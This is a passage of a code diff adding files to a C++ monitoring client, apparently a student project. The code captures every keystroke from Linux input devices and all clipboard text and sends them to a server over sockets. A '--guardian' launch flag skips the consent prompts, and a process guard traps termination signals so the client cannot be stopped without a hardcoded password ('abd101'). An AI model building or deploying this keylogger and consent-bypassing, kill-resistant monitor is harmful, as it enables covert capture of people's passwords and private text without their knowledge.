+        }
+          cout << "Clipboard monitoring stopped" <<   endl;
+    }
+
+    bool isMonitoring() const {
+        return monitoring_;
+    }
+
+private:
+    void monitorLoop() {
+          string initial_content = getClipboardText();
+        if (!initial_content.empty()) {
+            last_clipboard_content_ = initial_content;
+        }
+
+        while (monitoring_) {
+              string current_content = getClipboardText();
+            
+            if (!current_content.empty() && current_content != last_clipboard_content_) {
+                  string display_content = current_content;
+                if (display_content.length() > 100) {
+                    display_content = display_content.substr(0, 100) + "...";
+                }
+                
+                  cout << "Clipboard changed: " << display_content <<   endl;
+                
+                if (callback_) {
+                    if (current_content.length() > MAX_CLIPBOARD_SIZE) {
+                          string truncated = current_content.substr(0, MAX_CLIPBOARD_SIZE) + "...[TRUNCATED]";
+                        callback_("CLIPBOARD: " + truncated);
+                    } else {
+                        callback_("CLIPBOARD: " + current_content);
+                    }
+                }
+                
+                last_clipboard_content_ = current_content;
+            }
+            
+              this_thread::sleep_for(  chrono::milliseconds(500));
+        }
+    }
+
+      string getClipboardText() {
+        if (!OpenClipboard(nullptr)) {
+            return "";
+        }
+
+          string result;
+        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+        if (hData != nullptr) {
+            wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
+            if (pszText != nullptr) {
+                // Convert wide string to narrow string
+                int size = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, nullptr, 0, nullptr, nullptr);
+                if (size > 0) {
+                    char* buffer = new char[size];
+                    WideCharToMultiByte(CP_UTF8, 0, pszText, -1, buffer, size, nullptr, nullptr);
+                    result =   string(buffer);
+                    delete[] buffer;
+                }
+                GlobalUnlock(hData);
+            }
+        }
+
+        CloseClipboard();
+        return result;
+    }
+};
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./socket_utils_cross.hpp =====
+#ifndef SOCKET_UTILS_CROSS_HPP
+#define SOCKET_UTILS_CROSS_HPP
+
+#include "platform_detector.hpp"
+
+#ifdef PLATFORM_WINDOWS
+    #include <winsock2.h>
+    #include <ws2tcpip.h>
+    #pragma comment(lib, "ws2_32.lib")
+    typedef int socklen_t;
+    #define close closesocket
+#else
+    #include <sys/socket.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+    #include <unistd.h>
+#endif
+
+#include <string>
+#include <cstring>
+#include <stdexcept>
+#include <iostream>
+using namespace std; 
+
+class SocketUtils {
+private:
+    static bool wsa_initialized_;
+
+public:
+    static bool initializeWSA() {
+#ifdef PLATFORM_WINDOWS
+        if (!wsa_initialized_) {
+            WSADATA wsaData;
+            int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
+            if (result != 0) {
+                  cerr << "WSAStartup failed: " << result <<   endl;
+                return false;
+            }
+            wsa_initialized_ = true;
+        }
+#endif
+        return true;
+    }
+
+    static void cleanupWSA() {
+#ifdef PLATFORM_WINDOWS
+        if (wsa_initialized_) {
+            WSACleanup();
+            wsa_initialized_ = false;
+        }
+#endif
+    }
+
+    static int createSocket() {
+        initializeWSA();
+        
+        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+        if (sockfd < 0) {
+            throw   runtime_error("Failed to create socket");
+        }
+        
+        int opt = 1;
+#ifdef PLATFORM_WINDOWS
+        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0) {
+#else
+        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+#endif
+            throw   runtime_error("Failed to set socket options");
+        }
+        
+        return sockfd;
+    }
+
+    static void bindSocket(int sockfd, int port) {
+        sockaddr_in server_addr{};
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_addr.s_addr = INADDR_ANY;
+        server_addr.sin_port = htons(port);
+        
+        if (bind(sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            throw   runtime_error("Failed to bind socket");
+        }
+    }
+
+    static void listenSocket(int sockfd, int backlog = 10) {
+        if (listen(sockfd, backlog) < 0) {
+            throw   runtime_error("Failed to listen on socket");
+        }
+    }
+
+    static int acceptConnection(int sockfd) {
+        sockaddr_in client_addr{};
+        socklen_t client_len = sizeof(client_addr);
+        
+        int client_sockfd = accept(sockfd, (sockaddr*)&client_addr, &client_len);
+        if (client_sockfd < 0) {
+            throw   runtime_error("Failed to accept connection");
+        }
+        
+        return client_sockfd;
+    }
+
+    static void connectToServer(int sockfd, const   string& host, int port) {
+        sockaddr_in server_addr{};
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(port);
+        
+        if (inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr) <= 0) {
+            throw   runtime_error("Invalid address");
+        }
+        
+        if (connect(sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            throw   runtime_error("Failed to connect to server");
+        }
+    }
+
+    static bool sendData(int sockfd, const   string& data) {
+        size_t total_sent = 0;
+        while (total_sent < data.size()) {
+#ifdef PLATFORM_WINDOWS
+            int sent = send(sockfd, data.c_str() + total_sent, 
+                           (int)(data.size() - total_sent), 0);
+#else
+            ssize_t sent = send(sockfd, data.c_str() + total_sent, 
+                               data.size() - total_sent, 0);
+#endif
+            if (sent <= 0) {
+                return false;
+            }
+            total_sent += sent;
+        }
+        return true;
+    }
+
+    static   string receiveData(int sockfd, size_t max_size = 1024) {
+        char buffer[1024];
+#ifdef PLATFORM_WINDOWS
+        int received = recv(sockfd, buffer, (int)(max_size - 1), 0);
+#else
+        ssize_t received = recv(sockfd, buffer, max_size - 1, 0);
+#endif
+        if (received <= 0) {
+            return "";
+        }
+        buffer[received] = '\0';
+        return   string(buffer, received);
+    }
+};
+
+bool SocketUtils::wsa_initialized_ = false;
+
+#endif
+===== FILE: ./client_main.cpp =====
+#include "client_cross.hpp"
+#include <iostream>
+#include <string>
+#include <cstdlib>
+#include <cstring>
+using namespace std; 
+void printUsage() {
+      cout << "Usage: ./client <server_ip> <server_port> <client_id> [--guardian]" <<   endl;
+      cout << "Example: ./client 192.168.1.100 8080 bscs24009" <<   endl;
+      cout << "         ./client 192.168.1.100 8080 bscs24009 --guardian" <<   endl;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc < 4 || argc > 5) {
+        printUsage();
+        return 1;
+    }
+
+      string server_ip = argv[1];
+    int port =   stoi(argv[2]);
+      string client_id = argv[3];
+    
+    // Check if launched by guardian (skip consent prompts)
+    bool skip_consent = false;
+    if (argc == 5 &&   strcmp(argv[4], "--guardian") == 0) {
+        skip_consent = true;
+    } 
+
+    try {
+        Client client(server_ip, port, client_id, skip_consent);
+        
+        if (!client.start()) {
+              cerr << "Failed to start client" <<   endl;
+            return 1;
+        }
+        
+        if (!skip_consent) {
+              cout << "Client running. Press Enter to stop..." <<   endl;
+              cin.get();
+            client.stop();
+        } else {
+            // In guardian mode, run indefinitely until killed
+              cout << "Client running under guardian protection..." <<   endl;
+            while (true) {
+                  this_thread::sleep_for(  chrono::seconds(1));
+            }
+        }
+        
+    } catch (const   exception& e) {
+          cerr << "Error: " << e.what() <<   endl;
+        return 1;
+    }
+
+    return 0;
+}  
+===== FILE: ./process_guard_linux.hpp =====
+
+
+#ifndef PROCESS_GUARD_LINUX_HPP
+#define PROCESS_GUARD_LINUX_HPP
+
+#ifdef PLATFORM_LINUX
+
+#include <unistd.h>
+#include <signal.h>
+#include <sys/wait.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <string>
+#include <vector>
+#include <iostream>
+#include <atomic>
+#include <cstring>
+#include "launcher_common.hpp"
+#include "password_dialog_linux.hpp"
+using namespace std; 
+
+class ProcessGuardLinux {
+private:
+    pid_t child_pid;
+      atomic<bool>& exit_authorized;
+    static ProcessGuardLinux* instance_;
+    
+public:
+    ProcessGuardLinux(  atomic<bool>& auth) 
+        : child_pid(-1), exit_authorized(auth) {
+        instance_ = this;
+    }
+    
+    ~ProcessGuardLinux() {
+        instance_ = nullptr;
+    }
+    
+    bool launchClient(const   string& executable, const   string& args) {
+          cout << "🛡️  Guardian: Launching protected client..." <<   endl;
+        
+        // Install signal handlers BEFORE forking
+        installSignalHandlers();
+        
+        child_pid = fork();
+        
+        if (child_pid == -1) {
+              cerr << "❌ Fork failed: " << strerror(errno) <<   endl;
+            return false;
+        }
+        
+        if (child_pid == 0) {
+            // Child process - UNBLOCK signals so child can receive them normally
+            sigset_t unblock_set;
+            sigfillset(&unblock_set);
+            sigprocmask(SIG_UNBLOCK, &unblock_set, NULL);
+            
+            // Reset signal handlers to default in child
+            signal(SIGINT, SIG_DFL);
+            signal(SIGTERM, SIG_DFL);
+            signal(SIGQUIT, SIG_DFL);
+            signal(SIGHUP, SIG_DFL);
+            
+            // Create new process group to isolate from parent's signals
+            setpgid(0, 0);
+            
+            // Execute the client
+            executeClient(executable, args);
+            _exit(1); // Should never reach here
+        }
+        
+        // Parent process
+          cout << "✅ Client launched successfully under protection (PID: " 
+                  << child_pid << ")" <<   endl;
+          cout << "🔒 Exit protection active - password required to exit" <<   endl;
+        
+        return true;
+    }
+    
+    void monitorProcess() {
+          cout << "\n🔍 Guardian: Monitoring client process..." <<   endl;
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" <<   endl;
+          cout << "⚠️  IMPORTANT: To request exit, run this command in ANOTHER terminal:" <<   endl;
+          cout << "    sudo kill -INT " << getpid() <<   endl;
+          cout << "    (or: sudo kill -2 " << getpid() << ")" <<   endl;
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+        
+        int status;
+        while (true) {
+            pid_t result = waitpid(child_pid, &status, WNOHANG);
+            
+            if (result == child_pid) {
+                // Child process exited
+                if (exit_authorized) {
+                      cout << "✅ Authorized exit - Guardian shutting down" <<   endl;
+                    break;
+                } else {
+                      cout << "⚠️  Client process terminated unexpectedly!" <<   endl;
+                    if (WIFEXITED(status)) {
+                          cout << "Exit code: " << WEXITSTATUS(status) <<   endl;
+                    }
+                    break;
+                }
+            } else if (result == -1) {
+                  cerr << "❌ Error waiting for child: " << strerror(errno) <<   endl;
+                break;
+            }
+            
+            // Check if we should exit
+            if (exit_authorized) {
+                  cout << "🛑 Terminating client process..." <<   endl;
+                kill(child_pid, SIGTERM);
+                sleep(2);
+                kill(child_pid, SIGKILL);
+                break;
+            }
+            
+            usleep(100000); // 100ms
+        }
+    }
+    
+private:
+    void executeClient(const   string& executable, const   string& args) {
+        // Parse arguments
+          vector<  string> argTokens;
+          string current;
+        for (char c : args) {
+            if (c == ' ') {
+                if (!current.empty()) {
+                    argTokens.push_back(current);
+                    current.clear();
+                }
+            } else {
+                current += c;
+            }
+        }
+        if (!current.empty()) {
+            argTokens.push_back(current);
+        }
+        
+        // Build argv
+          vector<char*> argv;
+        argv.push_back(const_cast<char*>(executable.c_str()));
+        for (auto& arg : argTokens) {
+            argv.push_back(const_cast<char*>(arg.c_str()));
+        }
+        argv.push_back(nullptr);
+        
+        // Execute
+        execvp(executable.c_str(), argv.data());
+        
+        // If we reach here, exec failed
+          cerr << "❌ Failed to execute client: " << strerror(errno) <<   endl;
+    }
+    
+    void installSignalHandlers() {
+        // Block signals in child process by setting up handler BEFORE fork
+        struct sigaction sa;
+        sa.sa_handler = signalHandler;
+        sigemptyset(&sa.sa_mask);
+        sa.sa_flags = SA_RESTART; // Automatically restart system calls
+        
+        // Add all signals we want to block to the mask
+        sigaddset(&sa.sa_mask, SIGINT);
+        sigaddset(&sa.sa_mask, SIGTERM);
+        sigaddset(&sa.sa_mask, SIGQUIT);
+        sigaddset(&sa.sa_mask, SIGHUP);
+        
+        sigaction(SIGINT, &sa, NULL);   // Ctrl+C
+        sigaction(SIGTERM, &sa, NULL);  // kill command
+        sigaction(SIGQUIT, &sa, NULL);  // Ctrl+\
+        sigaction(SIGHUP, &sa, NULL);   // Terminal close
+        
+        // Block child from receiving these signals
+        sigset_t block_set;
+        sigemptyset(&block_set);
+        sigaddset(&block_set, SIGINT);
+        sigaddset(&block_set, SIGTERM);
+        sigprocmask(SIG_BLOCK, &block_set, NULL);
+    }
+    
+    static void signalHandler(int signum) {
+        // CRITICAL: Block signal from propagating to child process
+        signal(signum, signalHandler); // Re-install handler
+        
+        const char* signame = "UNKNOWN";
+        switch (signum) {
+            case SIGINT: signame = "SIGINT (Ctrl+C)"; break;
+            case SIGTERM: signame = "SIGTERM"; break;
+            case SIGQUIT: signame = "SIGQUIT (Ctrl+\\)"; break;
+            case SIGHUP: signame = "SIGHUP"; break;
+        }
+        
+        // Use write() instead of cout (signal-safe)
+        const char* msg = "\n\n🚨 Signal intercepted: ";
+        write(STDOUT_FILENO, msg, strlen(msg));
+        write(STDOUT_FILENO, signame, strlen(signame));
+        write(STDOUT_FILENO, "\n", 1);
+        
+        if (instance_) {
+            // Redirect stdin from controlling terminal
+            int tty_fd = open("/dev/tty", O_RDWR);
+            if (tty_fd >= 0) {
+                dup2(tty_fd, STDIN_FILENO);
+                close(tty_fd);
+            }
+            
+            instance_->handleExitAttempt();
+        }
+        
+        // DO NOT exit or terminate - just return
+    }
+    
+    void handleExitAttempt() {
+        // Ensure we can read from terminal
+          cout << "\n🔐 Password authentication required..." <<   endl;
+          cout << "╔════════════════════════════════════════╗" <<   endl;
+          cout << "║  EXIT AUTHORIZATION REQUIRED          ║" <<   endl;
+          cout << "╚════════════════════════════════════════╝" <<   endl;
+          cout << "Enter password to stop monitoring: " <<   flush;
+        
+        // Make sure stdin is unbuffered and ready
+          cin.clear();
+          cin.sync();
+        
+        // Read password
+          string password;
+        if (  getline(  cin, password)) {
+            if (verifyPassword(password)) {
+                  cout << "\n✅ Password correct - Exit authorized" <<   endl;
+                exit_authorized = true;
+                
+                // Terminate child gracefully
+                if (child_pid > 0) {                   
+                      cout << "🛑 Terminating client process..." <<   endl;
+                    kill(child_pid, SIGTERM); 
+                    sleep(1);
+                     
+                    // Check if still alive 
+                    int status;
+                    pid_t result = waitpid(child_pid, &status, WNOHANG); 
+                    if (result == 0) {
+                        // Still running, force kill
+                        kill(child_pid, SIGKILL); 
+                    }
+                }
+                
+                // Exit the guardian
+                  cout << "✅ Guardian shutdown complete" <<   endl;
+                exit(0);
+            } else {
+                showUnauthorizedMessage();
+                  cout << "🔄 Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
+            }
+        } else {
+            // Input failed, treat as wrong password
+            showUnauthorizedMessage();
+              cout << "🔄 Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
+        }
+    }
+};
+
+ProcessGuardLinux* ProcessGuardLinux::instance_ = nullptr;
+
+#endif // PLATFORM_LINUX
+#endif  
+===== FILE: ./keyboard_capture.hpp =====
+
+
+#ifndef KEYBOARD_CAPTURE_HPP
+#define KEYBOARD_CAPTURE_HPP
+
+#include <linux/input.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string>
+#include <vector>
+#include <fstream>
+#include <iostream>
+#include <cstring>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <unordered_map>
+using namespace std; 
+
+class KeyboardCapture {
+private:
+      atomic<bool> capturing_;
+      thread capture_thread_;
+      function<void(const   string&)> callback_;
+      string keyboard_device_;
+
+public:
+    KeyboardCapture(  function<void(const   string&)> callback) 
+        : capturing_(false), callback_(callback) {
+        findKeyboardDevice();
+    }
+
+    ~KeyboardCapture() {
+        stop();
+    }
+
+    bool start() {
+        if (capturing_) {
+            return false;
+        }
+
+        capturing_ = true;
+        capture_thread_ =   thread(&KeyboardCapture::captureLoop, this);
+        return true;
+    }
+
+    void stop() {
+        capturing_ = false;
+        if (capture_thread_.joinable()) {
+            capture_thread_.join();
+        }
+    }
+
+    bool isCapturing() const {
+        return capturing_;
+    }
+
+      string getKeyboardDevice() const {
+        return keyboard_device_;
+    }
+
+private:
+    void findKeyboardDevice() {
+          cout << "Searching for keyboard devices..." <<   endl;
+        
+        // Try event2 first (based on your system configuration)
+          vector<  string> possible_paths = {
+            "/dev/input/event2",  // Your specific keyboard device
+            "/dev/input/event3", "/dev/input/event4", "/dev/input/event5",
+            "/dev/input/event0", "/dev/input/event1", "/dev/input/event6",
+            "/dev/input/event7", "/dev/input/event8", "/dev/input/event9"
+        };
+
+        for (const auto& path : possible_paths) {
+              cout << "Testing device: " << path <<   endl;
+            if (isKeyboardDevice(path)) {
+                keyboard_device_ = path;
+                  cout << "✓ Found keyboard device: " << path <<   endl;
+                return;
+            }
+        }
+
+        throw   runtime_error("Could not find keyboard device. Please check permissions.");
+    }
+
+    bool isKeyboardDevice(const   string& path) {
+        int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
+        if (fd < 0) {
+              cout << "  ✗ Cannot open: " << strerror(errno) <<   endl;
+            return false;
+        }
+
+        // Get device capabilities
+        unsigned long evbit = 0;
+        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) < 0) {
+            close(fd);
+              cout << "  ✗ Cannot get capabilities" <<   endl;
+            return false;
+        }
+
+        // Check if device has key events
+        if (!(evbit & (1 << EV_KEY))) {
+            close(fd);
+              cout << "  ✗ Not a key device" <<   endl;
+            return false;
+        }
+
+        // Get key bitmap to verify it's a keyboard
+        unsigned char keybit[KEY_MAX/8 + 1];
+        memset(keybit, 0, sizeof(keybit));
+        
+        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
+            close(fd);
+              cout << "  ✗ Cannot get key bitmap" <<   endl;
+            return false;
+        }
+
+        close(fd);
+
+        // Check for common keyboard keys
+        bool has_letters = (keybit[KEY_A/8] & (1 << (KEY_A % 8)));
+        bool has_space = (keybit[KEY_SPACE/8] & (1 << (KEY_SPACE % 8)));
+        bool has_enter = (keybit[KEY_ENTER/8] & (1 << (KEY_ENTER % 8)));
+
+        if (has_letters && has_space && has_enter) {
+              cout << "  ✓ Valid keyboard device" <<   endl;
+            return true;
+        }
+
+          cout << "  ✗ Missing common keyboard keys" <<   endl;
+        return false;
+    }
+
+    void captureLoop() {
+          cout << "Starting capture loop on device: " << keyboard_device_ <<   endl;
+        
+        int fd = open(keyboard_device_.c_str(), O_RDONLY | O_NONBLOCK);
+        if (fd < 0) {
+              cerr << "Failed to open keyboard device: " << keyboard_device_ 
+                      << " Error: " << strerror(errno) <<   endl;
+            return;
+        }
+
+          cout << "✓ Successfully opened keyboard device. Capturing keystrokes..." <<   endl;
+          cout << "Try typing in any application (browser, terminal, etc.)" <<   endl;
+
+        input_event ev;
+        int event_count = 0;
+        
+        while (capturing_) {
+            ssize_t bytes_read = read(fd, &ev, sizeof(ev));
+            
+            if (bytes_read == sizeof(ev)) {
+                if (ev.type == EV_KEY) {
+                    event_count++;
+                      string event_type;
+                    switch (ev.value) {
+                        case 0: event_type = "RELEASE"; break;
+                        case 1: event_type = "PRESS"; break;
+                        case 2: event_type = "REPEAT"; break;
+                        default: event_type = "UNKNOWN"; break;
+                    }
+                    
+                    // Only process key presses for now
+                    if (ev.value == 1) {
+                          string key_name = keyCodeToString(ev.code);
+                          cout << "[" << event_count << "] Captured key: " << key_name 
+                                  << " (code: " << ev.code << ", type: " << event_type << ")" <<   endl;
+                        
+                        if (!key_name.empty() && callback_) {
+                            callback_(key_name);
+                        }
+                    }
+                }
+            } else if (bytes_read < 0) {
+                if (errno != EAGAIN) {
+                    // Non-recoverable error
+                      cerr << "Read error: " << strerror(errno) <<   endl;
+                    break;
+                }
+                // EAGAIN means no data available, just continue
+            }
+            
+              this_thread::sleep_for(  chrono::milliseconds(1));
+        }
+
+        close(fd);
+          cout << "Capture loop ended. Total events processed: " << event_count <<   endl;
+    }
+
+      string keyCodeToString(int key_code) {
+        static const unordered_map<int, string> key_map = {
+            {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"}, {KEY_E, "E"},
+            {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"}, {KEY_I, "I"}, {KEY_J, "J"},
+            {KEY_K, "K"}, {KEY_L, "L"}, {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"},
+            {KEY_P, "P"}, {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
+            {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"}, {KEY_Y, "Y"},
+            {KEY_Z, "Z"},
+            {KEY_0, "0"}, {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
+            {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"},
+            {KEY_SPACE, "SPACE"}, {KEY_ENTER, "ENTER"}, {KEY_BACKSPACE, "BACKSPACE"},
+            {KEY_TAB, "TAB"}, {KEY_ESC, "ESC"}, {KEY_LEFTCTRL, "CTRL"},
+            {KEY_LEFTSHIFT, "SHIFT"}, {KEY_RIGHTSHIFT, "RSHIFT"}, {KEY_LEFTALT, "ALT"},
+            {KEY_RIGHTALT, "RALT"}, {KEY_LEFTMETA, "META"}, {KEY_RIGHTMETA, "RMETA"},
+            {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"},
+            {KEY_APOSTROPHE, "'"}, {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
+            {KEY_BACKSLASH, "\\"}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_GRAVE, "`"},
+            {KEY_UP, "UP"}, {KEY_DOWN, "DOWN"}, {KEY_LEFT, "LEFT"}, {KEY_RIGHT, "RIGHT"},
+            {KEY_F1, "F1"}, {KEY_F2, "F2"}, {KEY_F3, "F3"}, {KEY_F4, "F4"},
+            {KEY_F5, "F5"}, {KEY_F6, "F6"}, {KEY_F7, "F7"}, {KEY_F8, "F8"},
+            {KEY_F9, "F9"}, {KEY_F10, "F10"}, {KEY_F11, "F11"}, {KEY_F12, "F12"}
+        };
+
+        auto it = key_map.find(key_code);
+        if (it != key_map.end()) {
+            return it->second;
+        }
+        return "KEY_" +   to_string(key_code);
+    }
+};
+
+#endif 
+===== FILE: ./guardian_exit.cpp =====
+#include <iostream>
+#include <string>
+#include <csignal>
+#include <cstring>
+#include <unistd.h>
+#include <sys/types.h>
+#include <fstream>
+#include <sstream>
+#include <termios.h>
+#include <vector>
+using namespace std; 
+  string getPasswordInput() {
+      string password;
+    
+    // Disable echo
+    termios oldt;
+    tcgetattr(STDIN_FILENO, &oldt);
+    termios newt = oldt;
+    newt.c_lflag &= ~ECHO;
+    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+    
+    // Read password
+      getline(  cin, password);
+    
+    // Restore echo
+    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+    
+    return password;
+}
+
+  vector<pid_t> findAllProcesses() {
+      vector<pid_t> pids;
+    
+    // Find launcher process
+      string cmd_launcher = "pgrep -f './launcher' 2>/dev/null";
+    FILE* pipe = popen(cmd_launcher.c_str(), "r");
+    if (pipe) {
+        char buffer[128];
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            pids.push_back(  stoi(buffer));
+        }
+        pclose(pipe);
+    }
+    
+    // Find client process
+      string cmd_client = "pgrep -f './client.*--guardian' 2>/dev/null";
+    pipe = popen(cmd_client.c_str(), "r");
+    if (pipe) {
+        char buffer[128];
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            pids.push_back(  stoi(buffer));
+        }
+        pclose(pipe);
+    }
+    
+    return pids;
+}
+
+int main(int argc, char* argv[]) {
+      cout << "\n╔════════════════════════════════════════╗" <<   endl;
+      cout << "║     GUARDIAN EXIT TOOL                ║" <<   endl;
+      cout << "╚════════════════════════════════════════╝\n" <<   endl;
+    
+    // Find all related processes
+      vector<pid_t> pids = findAllProcesses();
+    
+    if (pids.empty()) {
+          cerr << "❌ No launcher or client processes found!" <<   endl;
+          cerr << "   Make sure the protected client is running." <<   endl;
+        return 1;
+    }
+    
+      cout << "✓ Found " << pids.size() << " process(es) to terminate:" <<   endl;
+    for (pid_t pid : pids) {
+          cout << "  - PID: " << pid <<   endl;
+    }
+    
+      cout << "\n🔐 Enter password to stop monitoring: " <<   flush;
+    
+      string password = getPasswordInput();
+      cout <<   endl;
+    
+    // Hardcoded password check (CHANGE THIS to match launcher_common.hpp!)
+    if (password == "abd101") {
+          cout << "\n✅ Password correct - Sending termination signal..." <<   endl;
+        
+        int killed_count = 0;
+        int failed_count = 0;
+        
+        for (pid_t pid : pids) {
+            if (kill(pid, SIGKILL) == 0) {
+                  cout << "✅ Terminated process PID: " << pid <<   endl;
+                killed_count++;
+            } else {
+                  cerr << "⚠️  Failed to terminate PID " << pid << ": " << strerror(errno) <<   endl;
+                failed_count++;
+            }
+        }
+        
+          cout << "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" <<   endl;
+          cout << "✅ Successfully killed: " << killed_count << " process(es)" <<   endl;
+        if (failed_count > 0) {
+              cout << "⚠️  Failed to kill: " << failed_count << " process(es)" <<   endl;
+              cout << "   Try running with: sudo ./guardian_exit" <<   endl;
+        }
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+        
+        return (failed_count > 0) ? 1 : 0;
+    } else {
+          cout << "\n❌ INCORRECT PASSWORD!" <<   endl;
+          cout << "   Exit denied. Monitoring continues..." <<   endl;
+        return 1;
+    }
+}
+===== FILE: ./guardian_exit_windows.cpp =====
+#ifdef _WIN32
+
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <conio.h>
+using namespace std; 
+  string getPasswordInput() {
+      string password;
+    char ch;
+    
+    while (true) {
+        ch = _getch();
+        
+        if (ch == '\r' || ch == '\n') { // Enter key
+            break;
+        } else if (ch == '\b' || ch == 127) { // Backspace
+            if (!password.empty()) {
+                password.pop_back();
+                  cout << "\b \b"; // Erase character from display
+            }
+        } else if (ch >= 32 && ch <= 126) { // Printable characters only
+            password += ch;
+              cout << '*'; // Show asterisk
+        }
+    }
+    
+    return password;
+}
+
+  vector<DWORD> findAllProcesses() {
+      vector<DWORD> pids;
+    
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        return pids;
+    }
+    
+    PROCESSENTRY32 processEntry;
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (Process32First(snapshot, &processEntry)) {
+        do {
+              string exeName = processEntry.szExeFile;
+            
+            // Find launcher.exe and client.exe processes
+            if (exeName == "launcher.exe" || exeName == "client.exe") {
+                pids.push_back(processEntry.th32ProcessID);
+            }
+        } while (Process32Next(snapshot, &processEntry));
+    }
+    
+    CloseHandle(snapshot);
+    return pids;
+}
+
+int main(int argc, char* argv[]) {
+      cout << "\n╔════════════════════════════════════════╗" <<   endl;
+      cout << "║     GUARDIAN EXIT TOOL (Windows)      ║" <<   endl;
+      cout << "╚════════════════════════════════════════╝\n" <<   endl;
+    
+    // Find all related processes
+      vector<DWORD> pids = findAllProcesses();
+    
+    if (pids.empty()) {
+          cerr << "❌ No launcher or client processes found!" <<   endl;
+          cerr << "   Make sure the protected client is running." <<   endl;
+          cout << "\nPress any key to exit...";
+        _getch();
+        return 1;
+    }
+    
+      cout << "✓ Found " << pids.size() << " process(es) to terminate:" <<   endl;
+    for (DWORD pid : pids) {
+          cout << "  - PID: " << pid <<   endl;
+    }
+    
+      cout << "\n🔐 Enter password to stop monitoring: ";
+    
+      string password = getPasswordInput();
+      cout <<   endl;
+    
+    // Hardcoded password check (CHANGE THIS to match launcher_common.hpp!)
+    if (password == "abd101") {
+          cout << "\n✅ Password correct - Sending termination signal..." <<   endl;
+        
+        int killed_count = 0;
+        int failed_count = 0;
+        
+        for (DWORD pid : pids) {
+            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+            if (hProcess != NULL) {
+                if (TerminateProcess(hProcess, 0)) {
+                      cout << "✅ Terminated process PID: " << pid <<   endl;
+                    killed_count++;
+                } else {
+                      cerr << "⚠️  Failed to terminate PID " << pid << ": Error " << GetLastError() <<   endl;
+                    failed_count++;
+                }
+                CloseHandle(hProcess);
+            } else {
+                  cerr << "⚠️  Failed to open PID " << pid << ": Error " << GetLastError() <<   endl;
+                failed_count++;
+            }
+        }
+        
+          cout << "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" <<   endl;
+          cout << "✅ Successfully killed: " << killed_count << " process(es)" <<   endl;
+        if (failed_count > 0) {
+              cout << "⚠️  Failed to kill: " << failed_count << " process(es)" <<   endl;
+              cout << "   Try running as Administrator" <<   endl;
+        }
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+        
+          cout << "Press any key to exit...";
+        _getch();
+        return (failed_count > 0) ? 1 : 0;
+    } else {
+          cout << "\n❌ INCORRECT PASSWORD!" <<   endl;
+          cout << "   Exit denied. Monitoring continues..." <<   endl;
+          cout << "\nPress any key to exit...";
+        _getch();
+        return 1;
+    }
+}
+
+#endif // _WIN32
+===== FILE: ./launcher_linux.cpp =====
+#include "platform_detector.hpp"
+
+#ifdef PLATFORM_LINUX
+
+#include "launcher_common.hpp"
+#include "process_guard_linux.hpp"
+#include <iostream>
+#include <string>
+using namespace std; 
+void printUsage() {
+      cout << "═══════════════════════════════════════════════════════" <<   endl;
+      cout << "     PROTECTED CLIENT LAUNCHER (Linux)                " <<   endl;
+      cout << "═══════════════════════════════════════════════════════" <<   endl;
+      cout << "Usage: ./launcher <server_ip> <port> <client_id>" <<   endl;
